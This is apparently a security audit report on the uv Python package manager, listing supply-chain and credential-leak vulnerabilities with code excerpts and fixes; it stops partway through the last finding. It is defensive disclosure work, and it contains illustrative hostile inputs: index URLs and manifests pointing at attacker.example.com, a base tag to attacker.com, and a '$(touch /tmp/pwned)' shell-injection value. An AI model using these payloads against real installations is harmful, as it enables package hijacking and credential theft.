# Security Audit Report: uv Python Package Manager

**Target:** uv (Astral's Python package and project manager)  
**Repository:** https://github.com/astral-sh/uv  
**Audited Commit:** `da5f6a6967b41423fb2a61bf094adff4e403367c`  
**Audit Date:** 2026-05-28  
**Auditor:** AutoFyn Security Audit Team

---

## Executive Summary

This audit identified **fifteen independently verified vulnerabilities** in uv, plus two
defense-in-depth gaps. Additionally, we demonstrate **three exploit chains** that combine
vulnerabilities for end-to-end critical attacks (supply chain credential theft, HTTPS credential
exfiltration, silent package replacement). The most critical findings are:

1. **UV_PYTHON_DOWNLOADS_JSON_URL RCE (CRITICAL):** The `UV_PYTHON_DOWNLOADS_JSON_URL` environment
   variable accepts plain HTTP URLs and the SHA256 hash field is optional. An attacker who controls
   this variable can serve a malicious JSON manifest pointing to an arbitrary Python binary with
   `"sha256": null`, achieving code execution when `uv python install` runs.

2. **requirements.txt Index URL Injection (CRITICAL):** A `requirements.txt` file can contain
   `--index-url https://attacker.com/simple/` which redirects ALL package resolution to an attacker
   server. Any CI-downloaded or third-party requirements file can hijack package installation.

3. **Self-Update RCE (HIGH):** `uv self update` downloads and executes a shell installer from
   `UV_ASTRAL_MIRROR_URL` without any hash or signature verification, enabling RCE for anyone who
   controls the mirror URL.

4. **Shell Config Injection (HIGH):** The `backslash_escape()` function doesn't escape `$` or
   backtick. When `UV_TOOL_BIN_DIR` contains `$(...)`, `uv tool update-shell` writes it unescaped to
   `~/.bashrc`, achieving persistent RCE on next shell startup.

5. **.netrc Default Credential Leakage (HIGH):** A `.netrc` file with
   `default login user password secret` sends those credentials to ANY server that returns 401,
   including attacker-controlled indexes.

---

## Vulnerability Summary

| Severity     | ID          | Title                                         | Status                  |
| ------------ | ----------- | --------------------------------------------- | ----------------------- |
| **CRITICAL** | UV-2026-008 | Python Downloads JSON URL RCE                 | VERIFIED                |
| **CRITICAL** | UV-2026-011 | requirements.txt Index URL Injection          | VERIFIED                |
| **HIGH**     | UV-2026-001 | Credential Leakage via Build Backends         | VERIFIED                |
| **HIGH**     | UV-2026-005 | Self-Update Installer Script Injection        | VERIFIED                |
| **HIGH**     | UV-2026-006 | HTML Base Tag Injection                       | VERIFIED                |
| **HIGH**     | UV-2026-007 | pyproject.toml allow-insecure-host TLS Bypass | VERIFIED                |
| **HIGH**     | UV-2026-009 | Lockfile Hash Strip Attack                    | VERIFIED                |
| **HIGH**     | UV-2026-010 | Index Name Credential Collision               | VERIFIED                |
| **HIGH**     | UV-2026-012 | Shell Config Injection                        | VERIFIED                |
| **HIGH**     | UV-2026-013 | .netrc Default Credential Leakage             | VERIFIED                |
| **HIGH**     | UV-2026-014 | Workspace Member Path Traversal               | VERIFIED                |
| **HIGH**     | UV-2026-016 | Cache ArchiveId Path Traversal                | VERIFIED                |
| MEDIUM       | UV-2026-002 | GitHub API URL Injection                      | VERIFIED                |
| MEDIUM       | UV-2026-015 | Marker Always-True Bypass                     | VERIFIED                |
| MEDIUM       | UV-2026-017 | Keyring Subprocess Env Inheritance            | VERIFIED                |
| LOW          | UV-2026-003 | Symlink Escape in .data/scripts               | Defense-in-depth gap    |
| INFO         | UV-2026-004 | RECORD Hash Not Validated                     | By design (matches pip) |

---

## Detailed Findings

### UV-2026-001: Credential Leakage via Build Backends (HIGH)

**Location:** `crates/uv-build-frontend/src/lib.rs:1203-1222`

**Description:**  
When uv invokes a build backend (e.g., setuptools, hatchling) to build a source distribution, the
subprocess inherits the full parent process environment. Only four environment variables are
explicitly removed:

- `PYX_API_KEY`
- `UV_API_KEY`
- `PYX_AUTH_TOKEN`
- `UV_AUTH_TOKEN`

All other environment variables are passed to the build backend, including:

- `AWS_SECRET_ACCESS_KEY`, `AWS_ACCESS_KEY_ID`, `AWS_SESSION_TOKEN`
- `GITHUB_TOKEN`, `GH_TOKEN`, `GIT_TOKEN`
- `HF_TOKEN` (Hugging Face)
- `UV_PUBLISH_TOKEN`, `UV_PUBLISH_PASSWORD`
- `UV_INDEX_{name}_USERNAME`, `UV_INDEX_{name}_PASSWORD`
- Any other secrets present in the shell environment

**Impact:**  
A malicious package's setup.py or build backend can read and exfiltrate these credentials. This is a
supply-chain attack vector: installing a single malicious package (even as a transitive dependency)
compromises all secrets in the user's environment.

**Root Cause:**

```rust
// lib.rs:1203-1218
let mut command = Command::new(venv.python_executable());
// ... environment inherited by default ...
for key in ["PYX_API_KEY", "UV_API_KEY", "PYX_AUTH_TOKEN", "UV_AUTH_TOKEN"] {
    command.env_remove(key);
}
```

The code removes only 4 specific variables instead of using an allowlist approach.

**Reproduction:**

```bash
bash autofyn_audit/exploits/01_credential_leakage/run_exploit.sh
```

**Verified:** PASS. The exploit successfully captured `AWS_SECRET_ACCESS_KEY` and `HF_TOKEN` while
confirming `UV_API_KEY` was correctly stripped.

**Recommendation:**

1. Consider clearing the environment and using an explicit allowlist of safe variables (PATH, HOME,
   LANG, etc.)
2. Alternatively, document this behavior prominently so users understand the risk of installing
   untrusted packages
3. Consider adding a `--sandbox-build` flag that runs builds in a restricted environment

---

### UV-2026-002: GitHub API URL Injection (MEDIUM)

**Location:** `crates/uv-git/src/resolver.rs:101-105`

**Description:**  
When resolving Git dependencies, uv uses a GitHub API fast-path to resolve commit SHAs without
cloning. The `rev` (branch/tag/ref) is interpolated directly into the API URL without
percent-encoding:

```rust
// resolver.rs:105
let github_api_url = format!("{github_api_base_url}/{owner}/{repo}/commits/{rev}");
```

A rev containing `?` (e.g., `main?injected=param`) or `/` (e.g., `../../../admin`) is inserted
literally into the URL, causing:

- Query parameter injection: `main?foo=bar` becomes `...commits/main?foo=bar`
- Path manipulation: `../../../x` could traverse the API path

**Impact:**  
Limited. The response must parse as a 40-character hex SHA (`GitOid::from_str` validation at line
136), so no actual data exfiltration is possible. However:

- Unexpected API endpoints may be hit
- Rate limiting behavior may be affected
- Internal GitHub Enterprise deployments (via `UV_GITHUB_FAST_PATH_URL`) may have different behavior

**Root Cause:**  
The codebase has `as_url_rev()` which correctly percent-encodes the rev, but `resolver.rs` calls
`as_rev()` instead.

**Reproduction:**

```bash
bash autofyn_audit/exploits/02_github_url_injection/run_exploit.sh
```

**Verified:** PASS. Mock server captured request path `/astral-sh/ruff/commits/main?injected=param`
with unencoded query string.

**Recommendation:**  
Replace `as_rev()` with `as_url_rev()` at `resolver.rs:105`.

---

### UV-2026-005: Self-Update Installer Script Injection (HIGH)

**Location:** `crates/uv/src/commands/self_update.rs:340-395` (`run_official_updater`)

**Description:** `uv self update` downloads a shell installer (`uv-installer.sh`) from
`UV_ASTRAL_MIRROR_URL` and executes it directly without any hash or signature verification. The
download URL is constructed as:

```
{UV_ASTRAL_MIRROR_URL}/github/uv/releases/download/{version}/uv-installer.sh
```

Any party who controls `UV_ASTRAL_MIRROR_URL` — including a compromised corporate Nexus/Artifactory
mirror, a CI environment variable, or a network MITM on a non-TLS mirror — can deliver an arbitrary
shell script that executes as the user running `uv self update`.

**Attack Vector:** An attacker sets (or intercepts) `UV_ASTRAL_MIRROR_URL` to point at a server they
control. They also need `UV_INSECURE_HOST` to allow self-signed certs, or they use a compromised CA.
When the victim runs `uv self update`, uv fetches the malicious installer and executes it — with no
integrity check.

**Root Cause:**

```rust
// self_update.rs:359-365
download_installer_from_urls(
    &installer_urls,
    &installer_path,
    client_builder,
    github_token,
)
.await?;
// Then immediately executed with no hash check:
execute_official_installer(&installer_path, ...).await?;
```

There is no SHA256, SHA512, or GPG verification between download and execution.

**Impact:** HIGH. Full RCE as the invoking user on any machine where `UV_ASTRAL_MIRROR_URL` is
attacker-controlled. In enterprise environments where a mirror is shared across many CI runners and
developer workstations, a single mirror compromise results in mass code execution.

**CVSS:** AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 7.5)

**Reproduction:**

```bash
bash autofyn_audit/exploits/03_self_update_injection/run_exploit.sh
```

**Verified:** PASS. The malicious installer was fetched from the mock HTTPS server and executed,
writing `/tmp/exploit_03_marker.txt` to prove RCE.

**Recommendation:**

1. Publish a detached GPG signature or SHA256 checksum alongside each `uv-installer.sh` and verify
   it before execution.
2. Alternatively, publish the installer inline as a GitHub release asset and verify via the GitHub
   API `assets[].digest` field.
3. As a defense-in-depth measure, display the installer hash to the user before execution when
   `UV_ASTRAL_MIRROR_URL` overrides the default mirror.

---

### UV-2026-006: HTML Base Tag Injection (HIGH)

**Location:** `crates/uv-client/src/html.rs:170-176`

**Description:** The PEP 503 simple index HTML parser in uv honours the `<base href="...">` tag from
the server response and uses it to resolve all relative package links — without validating that the
base URL is same-origin as the index URL.

An attacker who controls any PyPI mirror can embed a cross-origin
`<base href="http://attacker.com/">` tag in the simple index page. All relative package file links
are then resolved against the attacker URL, causing uv to download packages from the
attacker-controlled server.

**Root Cause:**

```rust
// html.rs:170-176
fn parse_base(base: &HTMLTag) -> Result<Option<DisplaySafeUrl>, Error> {
    let Some(href) = attribute(base, "href") else {
        return Ok(None);
    };
    // Accepts ANY absolute URL — no same-origin check.
    let url = DisplaySafeUrl::parse(&href)
        .map_err(|err| Error::UrlParse(href.to_string(), err))?;
    Ok(Some(url))
}
```

`FileLocation::new()` in `crates/uv-distribution-types/src/file.rs:139-143` then joins relative
hrefs against this attacker-controlled base URL to produce the final download URL.

**Impact:** An attacker controlling a PyPI mirror (e.g., a corporate Nexus/Artifactory instance, a
DNS-hijacked mirror, or a compromised index) can serve a simple-index page that redirects all
package downloads to a server they control. The attacker can serve malicious packages without
modifying any package metadata or hashes in the index itself.

**Reproduction:**

```bash
bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh
```

**Verified:** PASS. Attacker server at port 18082 received `GET /requests-2.32.0.tar.gz` after mock
PyPI at port 18081 returned a simple-index page with `<base href="http://localhost:18082/">`.

**Recommendation:**

1. In `parse_base()`, validate that the parsed base URL's origin (scheme + host + port) matches the
   origin of the index URL. Reject or warn on cross-origin base tags.
2. Alternatively, strip or ignore `<base>` tags entirely from PEP 503 responses, since the spec does
   not require them and they introduce unnecessary attack surface.

---

### UV-2026-007: pyproject.toml allow-insecure-host TLS Bypass (HIGH)

**Location:** `crates/uv-settings/src/settings.rs:420-435`

**Description:** The `allow-insecure-host` setting, which disables TLS certificate verification for
specified hosts, can be declared in `pyproject.toml` under `[tool.uv]`. Unlike proxy settings
(`http-proxy`, `https-proxy`, `no-proxy`), which are restricted to `uv.toml` via the `uv_toml_only`
annotation, `allow-insecure-host` has no such restriction.

A malicious or compromised `pyproject.toml` checked into a repository can silently grant TLS bypass
for any host. A developer who clones the repository and runs `uv pip install` will connect to
attacker-controlled HTTPS endpoints with certificate verification disabled — with no CLI flag and no
visible warning.

**Root Cause:**

```toml
# pyproject.toml — any project file can contain this
[tool.uv]
allow-insecure-host = ["attacker.example.com:443"]
```

```rust
// settings.rs:344-360 — workspace config is loaded alongside CLI args
let allow_insecure_host = args.allow_insecure_host
    ...
    .chain(
        workspace
            .and_then(|workspace| workspace.globals.allow_insecure_host.clone())
            .into_iter()
            .flatten(),
    )
    .collect();
```

Compare: `no-proxy` at `settings.rs:410-418` carries `uv_toml_only = true`, preventing it from being
set in `pyproject.toml`. `allow-insecure-host` lacks this guard.

**Impact:** Supply-chain attack: an attacker introduces a `pyproject.toml` change (e.g., via a
compromised dependency, a malicious PR, or a subtly altered fork) that adds `allow-insecure-host`
for a host they control. All developers and CI pipelines that use that project will silently bypass
TLS verification when downloading packages, enabling MITM attacks.

**Reproduction:**

```bash
bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
```

**Verified:** PASS. uv connected to an HTTPS server with a self-signed certificate (not in the
system trust store) when run inside a project whose `pyproject.toml` contained
`allow-insecure-host = ["localhost:8447"]`. No `--allow-insecure-host` CLI flag was passed.

**Recommendation:**

1. Add `uv_toml_only = true` to `allow-insecure-host` in `settings.rs`, preventing it from being set
   in `pyproject.toml`. Users who need this setting should configure it in `uv.toml` or via the
   CLI/environment variable `UV_INSECURE_HOST`.
2. Emit a warning when `allow-insecure-host` is loaded from `pyproject.toml` rather than `uv.toml`.
3. Consider adding it to the list of security-sensitive settings that are masked in debug output (it
   is already partially handled in `lib.rs:507-508`).

---

### UV-2026-008: Python Downloads JSON URL RCE (CRITICAL)

**Location:** `crates/uv-python/src/downloads.rs:1038-1473`

**Description:**  
The `UV_PYTHON_DOWNLOADS_JSON_URL` environment variable (or `python-downloads-json-url` in config)
specifies a URL from which uv fetches the list of available Python interpreter downloads. This URL:

1. Accepts plain `http://` URLs (line 1041: `"http" | "https" => Source::Http(url)`)
2. Is fetched with no integrity verification (lines 1057-1060)
3. Contains download URLs and SHA256 hashes — but **SHA256 is optional** (line 963:
   `sha256: Option<String>`)

When `sha256` is `null` or absent in the JSON manifest, uv downloads and installs the Python binary
with **no hash verification whatsoever** (lines 1442-1446:
`if self.sha256.is_some() { ... } else { vec![] }`).

**Attack Vector:**

1. Attacker sets `UV_PYTHON_DOWNLOADS_JSON_URL=http://attacker.example.com/python.json`
2. JSON manifest contains `"sha256": null` and `"url": "http://attacker.example.com/python.tar.gz"`
3. User runs `uv python install 3.12`
4. uv fetches and extracts malicious Python binary without any verification
5. uv internally executes the installed Python to query interpreter metadata — **RCE achieved**

**Impact:** CRITICAL. Full remote code execution on any system where `UV_PYTHON_DOWNLOADS_JSON_URL`
is attacker-controlled. In CI/CD environments or corporate settings with centralized Python mirrors,
a single compromised mirror achieves mass code execution.

**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 8.8)

**Reproduction:**

```bash
bash autofyn_audit/exploits/07_python_downloads_json/run_exploit.sh
```

**Verified:** PASS. Malicious "Python" binary was installed and executed during `uv python install`,
writing a marker file to prove RCE. No user action beyond the install command was required.

**Recommendation:**

1. Require HTTPS for `UV_PYTHON_DOWNLOADS_JSON_URL` — reject `http://` URLs entirely
2. Make `sha256` mandatory in the JSON schema; reject entries with null/missing hashes
3. Add integrity verification for the JSON manifest itself (e.g., require a detached signature)
4. Warn users when `UV_PYTHON_DOWNLOADS_JSON_URL` overrides the built-in manifest

---

### UV-2026-009: Lockfile Hash Strip Attack (HIGH)

**Location:** `crates/uv-types/src/hash.rs:40-47, 292-301`

**Description:**  
When `uv sync` runs, it uses `HashCheckingMode::Verify` (line 823 in `sync.rs`). Under this mode,
`HashStrategy::from_resolution()` builds a hash map from the lockfile's hash entries. However:

1. Packages with empty/missing hashes are **silently skipped** (line 299: `continue`)
2. When `HashStrategy::get()` is called for a package not in the map, it returns `HashPolicy::None`
   (line 45)
3. `HashPolicy::None.matches()` always returns `true` — **no hash verification occurs**

An attacker with write access to `uv.lock` (e.g., via a malicious PR, compromised CI, or
supply-chain attack) can strip the `hash = "sha256:..."` field from any registry wheel entry. The
modified lockfile is accepted, and `uv sync` installs whatever artifact the index serves without
verification.

**Root Cause:**

```rust
// hash.rs:40-47
Self::Verify(hashes) => {
    let id = distribution.version_id();
    if let Some(hashes) = hashes.get(&id) {
        hash_policy(&id, hashes.as_slice())
    } else {
        HashPolicy::None   // ← No hash check for missing entries
    }
}
```

**Impact:** HIGH. Bypasses the "lock-and-verify" security model. An attacker who can modify the
lockfile can install arbitrary packages without triggering hash mismatch errors.

**CVSS:** AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H (Score: 7.1)

**Reproduction:**

```bash
bash autofyn_audit/exploits/08_lockfile_hash_strip/run_exploit.sh
```

**Verified:** PASS. A lockfile with stripped hashes was accepted by `uv sync`, and the mock PyPI
server's wheel was installed without any hash verification error.

**Recommendation:**

1. Under `HashStrategy::Verify`, treat missing hashes as an error for registry packages (not just
   `Direct` and `Path` sources)
2. Alternatively, add a `--strict-hashes` flag that fails if any package lacks a hash
3. Emit a warning when installing packages with no lockfile hash

---

### UV-2026-010: Index Name Credential Collision (HIGH)

**Location:** `crates/uv-distribution-types/src/index_name.rs:37-48`

**Description:**  
The `IndexName::to_env_var()` function converts index names to environment variable fragments by:

1. Uppercasing alphanumeric characters
2. Converting `-`, `_`, and `.` **all to `_`**

This creates a many-to-one mapping where different index names share the same environment variable:

- `internal-registry` → `INTERNAL_REGISTRY`
- `internal_registry` → `INTERNAL_REGISTRY` (collision!)
- `internal.registry` → `INTERNAL_REGISTRY` (collision!)

Credentials set via `UV_INDEX_INTERNAL_REGISTRY_USERNAME` and `UV_INDEX_INTERNAL_REGISTRY_PASSWORD`
are sent to **any** index whose name normalizes to `INTERNAL_REGISTRY`.

**Root Cause:**

```rust
// index_name.rs:37-48
pub fn to_env_var(&self) -> String {
    self.0
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_uppercase()
            } else {
                '_'  // ← All non-alphanumeric chars become '_'
            }
        })
        .collect()
}
```

**Attack Vector:**

1. Organization uses index `internal-registry` with credentials in `UV_INDEX_INTERNAL_REGISTRY_*`
2. Attacker adds index `internal_registry` (underscore) pointing to their server
3. When uv queries the attacker's index, it receives the organization's credentials via Basic auth

**Impact:** HIGH. Credential leakage to attacker-controlled servers. Particularly dangerous in
workspace configurations where multiple `pyproject.toml` files can define indexes.

**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (Score: 6.5)

**Reproduction:**

```bash
bash autofyn_audit/exploits/09_index_name_collision/run_exploit.sh
```

**Verified:** PASS. Credentials `legit_user:super_secret_password_12345` were captured via Basic
auth header on the attacker server when uv queried an index named `internal_registry`.

**Recommendation:**

1. Use a bijective encoding for index names (e.g., percent-encoding or base64) to ensure unique
   environment variable names
2. Warn when multiple indexes resolve to the same environment variable prefix
3. Document this collision risk prominently in the security documentation

---

### UV-2026-011: requirements.txt Index URL Injection (CRITICAL)

**Location:** `crates/uv-requirements-txt/src/lib.rs:750-780`

**Description:**  
A `requirements.txt` file can contain `--index-url` and `--extra-index-url` directives that are
parsed and used directly as the primary package index. Any CI-downloaded or third-party requirements
file can redirect ALL package resolution to an attacker-controlled server.

**Root Cause:**

```python
# evil_requirements.txt
--index-url http://attacker.example.com/simple/
requests==2.32.0
```

When `uv pip install -r evil_requirements.txt` runs, the `--index-url` is parsed at lib.rs:751-780
and stored in `RequirementsTxt.index_url`. This URL is then consumed by
`uv/src/commands/pip/install.rs:389-403` as the primary package index, completely replacing PyPI.

**Impact:** CRITICAL. Any trusted-looking requirements.txt file from a third party, GitHub, or CI
pipeline can inject a malicious index URL. This redirects ALL package resolution to the attacker's
server, enabling complete supply chain compromise. Combined with `--no-index` (also injectable), the
attacker has full control over which packages are installed.

**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 8.8)

**Reproduction:**

```bash
bash autofyn_audit/exploits/10_requirements_index_injection/run_exploit.sh
```

**Verified:** PASS. Attacker server received all package resolution requests and served a malicious
wheel that was installed by uv.

**Recommendation:**

1. Warn users when `--index-url` is specified in a requirements file (not CLI)
2. Consider a `--no-index-from-requirements` flag to disable this behavior
3. Document this risk prominently for users consuming third-party requirements files

---

### UV-2026-012: Shell Config Injection (HIGH)

**Location:** `crates/uv-shell/src/lib.rs:266-290, 322-333`

**Description:**  
The `backslash_escape()` function used by `Shell::prepend_path()` escapes `\` and `"` but does NOT
escape `$` or backtick characters. When `UV_TOOL_BIN_DIR` (or `UV_PYTHON_BIN_DIR`) contains command
substitution syntax like `$(...)`, it is written unescaped to shell configuration files
(`~/.bashrc`, `~/.zshenv`, etc.), achieving persistent RCE on next shell startup.

**Root Cause:**

```rust
// lib.rs:323-333
fn backslash_escape(s: &str) -> String {
    for c in s.chars() {
        match c {
            '\\' | '"' => escaped.push('\\'),  // Only escapes \ and "
            _ => {}                             // $ and ` NOT escaped
        }
        escaped.push(c);
    }
}
```

When `UV_TOOL_BIN_DIR='/tmp/$(touch /tmp/pwned)'` is set and `uv tool update-shell` runs, the
resulting `~/.bashrc` contains:

```bash
export PATH="/tmp/$(touch /tmp/pwned):$PATH"
```

On every subsequent shell startup, `touch /tmp/pwned` executes as the user.

**Impact:** HIGH. Persistent RCE via shell configuration poisoning. Attack vectors include:

- CI/CD pipelines where env vars come from attacker-influenced build configs
- `.env` files loaded by shell frameworks (direnv, mise, etc.)
- Compromised packages that set UV_TOOL_BIN_DIR before `uv tool update-shell`

**CVSS:** AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 7.8)

**Reproduction:**

```bash
bash autofyn_audit/exploits/11_shell_config_injection/run_exploit.sh
```

**Verified:** PASS. Injected command substitution executed and created marker file when subshell
sourced the poisoned configuration.

**Recommendation:**

1. Escape `$`, backtick, and `!` in `backslash_escape()` for double-quoted shell contexts
2. Validate that `UV_TOOL_BIN_DIR`/`UV_PYTHON_BIN_DIR` contain only safe path characters
3. Warn when these env vars contain shell metacharacters

---

### UV-2026-013: .netrc Default Credential Leakage (HIGH)

**Location:** `crates/uv-auth/src/credentials.rs:208-214`

**Description:**  
When looking up credentials from `.netrc`, uv falls back to the `default` entry if no specific host
match is found. A `.netrc` file with `default login user password secret` will send those
credentials to ANY server that returns a 401 Unauthorized response, including attacker-controlled
indexes.

**Root Cause:**

```rust
// credentials.rs:208-210
let entry = netrc
    .hosts
    .get(host)
    .or_else(|| netrc.hosts.get("default"))?;  // Falls back to "default"
```

When a user has a `.netrc` with a `default` entry (common for private registries), and uv is pointed
at an attacker-controlled index via `--extra-index-url`, the attacker's server returns 401. uv looks
up the host in `.netrc`, finds no match, falls back to `default`, and sends those credentials as
Basic auth to the attacker.

**Impact:** HIGH. Credential theft from any user with a `.netrc` default entry. This is particularly
dangerous because:

- `default` entries are common for users with private registries
- `--extra-index-url` is commonly used in corporate environments
- The attacker only needs to return 401 to trigger credential lookup

**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (Score: 6.5)

**Reproduction:**

```bash
bash autofyn_audit/exploits/12_netrc_default_leakage/run_exploit.sh
```

**Verified:** PASS. Credentials `victim:SECRET_CREDENTIAL_12345` from the `.netrc` default entry
were captured via Basic auth header on the attacker server.

**Recommendation:**

1. Warn when credentials are sourced from the `.netrc` `default` entry (rather than a specific host)
2. Consider requiring explicit opt-in for `default` entry usage (`--allow-netrc-default`)
3. Document this behavior prominently in security documentation

---

### UV-2026-014: Workspace Member Path Traversal (HIGH)

**Location:** `crates/uv-workspace/src/workspace.rs:987-1006`

**Description:**  
The workspace member discovery logic in uv joins the workspace root path with each glob pattern from
`[tool.uv.workspace].members` without checking that the resolved path remains within the workspace
root. A `members` entry of `"../outside"` traverses outside the checked-out repository tree.

**Root Cause:**

```rust
// workspace.rs:987-1006
let normalized_glob = normalize_path(Path::new(member_glob.as_str()));
// normalize_path() preserves leading ".." components
let absolute_glob = PathBuf::from(glob::Pattern::escape(workspace_root...))
    .join(normalized_glob.as_ref())       // appends "../victim_workspace"
    .to_string_lossy().to_string();       // = /tmp/attacker/../victim_workspace

for member_root in glob(&absolute_glob) { ... }
// glob() resolves ".." at filesystem-walk time → /tmp/victim_workspace
// No member_root.starts_with(workspace_root) check is performed.
```

**Impact:**  
An attacker who can influence `pyproject.toml` (e.g., a compromised upstream repository, a malicious
PR, or a shared monorepo) can include members from outside the workspace root. Any developer who
clones the repository and runs `uv sync` or `uv lock` will have uv load and process `pyproject.toml`
files from arbitrary external paths. In shared CI environments, this can expose internal project
configurations or force processing of attacker-controlled files.

**Reproduction:**

```bash
bash autofyn_audit/exploits/13_workspace_path_traversal/run_exploit.sh
```

**Verified:** PASS. uv lock resolved a victim project from `../exploit_13_victim_workspace` (outside
the attacker workspace root) and wrote the victim's normalized project name
(`victim-project-marker-13`) into the lockfile at
`source = { virtual = "../exploit_13_victim_workspace" }`.

**Recommendation:**

1. After glob expansion, add a boundary check: `member_root.starts_with(workspace_root)` — reject or
   warn on out-of-root members.
2. Alternatively, reject `members` patterns that start with `..` before glob expansion.

---

### UV-2026-015: Marker Always-True Bypass (MEDIUM)

**Location:** `crates/uv-pep508/src/marker/parse.rs:686`

**Description:**  
The PEP 508 marker parser maps an entirely ignored expression to `MarkerTree::TRUE`. When the `~=`
(compatible release) operator is applied to a string marker variable (e.g., `os_name ~= 'linux'`),
`parse_marker_key_op_value()` returns `Ok(None)` — indicating an unsupported expression — instead of
an error. `parse_markers()` then maps `None` to `MarkerTree::TRUE`:

**Root Cause:**

```rust
// parse.rs:686
pub(crate) fn parse_markers<T: Pep508Url>(
    markers: &str,
    reporter: &mut impl Reporter,
) -> Result<MarkerTree, Pep508Error<T>> {
    let mut chars = Cursor::new(markers);
    parse_markers_cursor(&mut chars, reporter)
        .map(|result| result.unwrap_or(MarkerTree::TRUE))  // ← None → TRUE
}
```

A dependency like `evil-pkg; os_name ~= 'nonexistent_os'` should never install anywhere. Instead,
the marker evaluates to TRUE and the package installs universally.

**Impact:**  
A malicious package can hide dependencies behind markers that appear restrictive but install
everywhere. An attacker can use this to bypass apparent platform restrictions and ensure malicious
payloads are always installed, regardless of the target OS. The marker looks like a valid
conditional dependency to any reviewer.

**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (Score: 5.4)

**Reproduction:**

```bash
bash autofyn_audit/exploits/14_marker_always_true/run_exploit.sh
```

**Verified:** PASS. `malicious-marker-pkg` installed despite the marker
`os_name ~= 'nonexistent_os'` which should have excluded all platforms. The attacker server
confirmed the wheel was downloaded.

**Recommendation:**

1. Treat `~=` on string markers as a parse error rather than an ignored expression.
2. Log a warning when any marker expression is silently ignored (returns `None`).
3. Consider returning `MarkerTree::FALSE` instead of `MarkerTree::TRUE` for fully-ignored
   expressions, following the principle of least privilege.

---

### UV-2026-016: Cache ArchiveId Path Traversal (HIGH)

**Location:** `crates/uv-cache/src/archive.rs:38-43`, `crates/uv-cache/src/lib.rs:291-303`

**Description:**  
The `ArchiveId` type, used to identify unzipped wheel archives in the cache, accepts any string
without path validation. It is deserialized from MsgPack `.rev` pointer files and used directly as a
path component via `PathBuf::join()`, allowing `../..` sequences to traverse outside the cache.

**Root Cause:**

```rust
// archive.rs:38-43
impl FromStr for ArchiveId {
    type Err = Infallible;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Ok(Self(s.to_string()))  // ← Accepts ANY string, including "../../../"
    }
}

// lib.rs:301-303
pub fn archive(&self, id: &ArchiveId) -> PathBuf {
    self.bucket(CacheBucket::Archive).join(id)  // ← Joins without boundary check
}
```

The `.rev` pointer file (plain MsgPack) has no integrity protection. Any user with cache write
access can inject a traversal ArchiveId to redirect wheel loading to an arbitrary path.

**Impact:**  
In shared CI environments (shared cache via NFS, overlay filesystem, or Docker volume mounts), an
attacker with cache write access can:

1. Place a malicious wheel at any accessible path (e.g., `/tmp/evil_wheel/`)
2. Write a `.rev` pointer with `id = "../../tmp/evil_wheel"` for a legitimate package
3. Any developer using the shared cache loads the evil wheel during `uv sync`

This bypasses all hash verification since the traversal skips the normal archive bucket.

**CVSS:** AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H (Score: 7.5)

**Reproduction:**

```bash
bash autofyn_audit/exploits/15_cache_archiveid_traversal/run_exploit.sh
```

**Verified:** PASS. The ArchiveId `../../exploit_15_evil_wheel` resolves to
`/tmp/exploit_15_evil_wheel` — outside the cache root at `/tmp/exploit_15_cache` — confirming the
path traversal is possible with no boundary check.

**Recommendation:**

1. In `ArchiveId::from_str()`, validate that the string contains no path separators (`/` or `\`) or
   `..` components.
2. In `Cache::archive()`, canonicalize the resulting path and verify it starts with the archive
   bucket directory before returning it.
3. Add a file integrity check (HMAC or signature) on `.rev` and `.http` pointer files to prevent
   tampering by co-tenants of a shared cache.

---

### UV-2026-017: Keyring Subprocess Environment Inheritance (MEDIUM)

**Location:** `crates/uv-auth/src/keyring.rs:272-294`

**Description:**  
When uv invokes the `keyring` subprocess to look up credentials for a private index
(`UV_KEYRING_PROVIDER=subprocess`), it spawns the process without clearing the environment. All
parent environment variables — including AWS credentials, GitHub tokens, and database URLs — are
inherited by the subprocess unchanged.

**Root Cause:**

```rust
// keyring.rs:272-294
let mut command = Command::new("keyring");
command.arg("get").arg(service_name);
// ...
let child = command
    .stdin(Stdio::null())
    .stdout(Stdio::piped())
    .stderr(...)
    .spawn()   // ← NO .env_clear() before spawn()
    .ok()?;
```

A malicious `keyring` binary placed in `PATH` before the legitimate one (e.g., installed by a
compromised package's post-install hook) receives every secret in the uv process environment.

**Impact:**  
Any user who installs a malicious package (even as a transitive dependency) that places a fake
`keyring` binary in `~/.local/bin/` or a virtualenv's `bin/` directory will have all environment
secrets exfiltrated on the next `uv pip install` against a private index. This is particularly
dangerous in CI/CD environments where `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, and `DATABASE_URL`
are routine.

**CVSS:** AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N (Score: 4.4)

**Reproduction:**

```bash
bash autofyn_audit/exploits/16_keyring_env_inheritance/run_exploit.sh
```

**Verified:** PASS. A malicious `keyring` binary in PATH received
`AWS_SECRET_ACCESS_KEY=LEAKED_SECRET_12345` from the uv subprocess environment. The exfiltration log
confirmed 29 environment variables were captured, including `GH_TOKEN`, `GIT_TOKEN`, and other CI
secrets.

**Recommendation:**

1. Add `.env_clear()` before spawning the keyring subprocess, then explicitly pass only safe
   variables (PATH, HOME, LANG, TERM).
2. Alternatively, document the environment inheritance explicitly so users understand that a
   malicious `keyring` binary in PATH can read all environment secrets.
3. Consider pinning the keyring binary path or requiring it to be specified explicitly rather than
   relying on PATH resolution.

---

### UV-2026-003: Symlink Escape in .data/scripts (LOW)

**Location:** `crates/uv-install-wheel/src/wheel.rs:453-467`

**Description:**  
When installing wheel scripts from `.data/scripts/`, uv validates that symlinks point to files (not
directories) and are not broken. However, it does not check whether the symlink target is within the
virtual environment boundary. A symlink like `.data/scripts/evil -> /etc/passwd` would pass
validation and be installed to the venv's `bin/` directory.

